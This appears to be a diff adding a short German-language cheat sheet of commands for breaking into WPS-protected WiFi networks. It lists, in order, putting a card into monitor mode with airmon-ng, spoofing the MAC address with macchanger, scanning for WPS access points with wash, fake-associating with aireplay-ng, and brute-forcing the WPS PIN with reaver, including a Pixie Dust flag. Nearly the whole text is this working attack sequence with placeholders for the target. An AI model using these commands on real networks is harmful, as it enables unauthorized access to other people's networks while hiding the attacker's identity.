@@ -1,0 +1,40 @@
+MONITOR MODUS
+airmon-ng check
+airmon-ng check kill
+airmon-ng start wlan0
+
+MACCHANGER EINSCHALTEN
+ifconfig
+ifconfig wlan0mon down
+macchanger -r wlan0mon
+ifconfig wlan0mon up
+ifconfig
+
+INFO
+wash -i wlan0mon --ignore-fcs
+
+CHANNEL
+iwconfig wlan0mon channel X
+
+CONNECT
+aireplay-ng wlan0mon -1 110 -a XXXXXXXXXXXX -e XXXXXXXXXX 
+(ggf \ vor jedem leerzeichen und jedem !)
+
+BRUTE FORCE
+reaver -i wlan0mon -b XXXXXXXXXXXX -c X -w -A
+
+-i interface
+-c channel
+-b bssid
+-v verbose(display non critical warnings)
+-w soll schneller sein
+-K pixiedustattack
+-A, --no-associate              Do not associate with the AP (association must be done by another application)
+
+
+
+
+
+
+
+
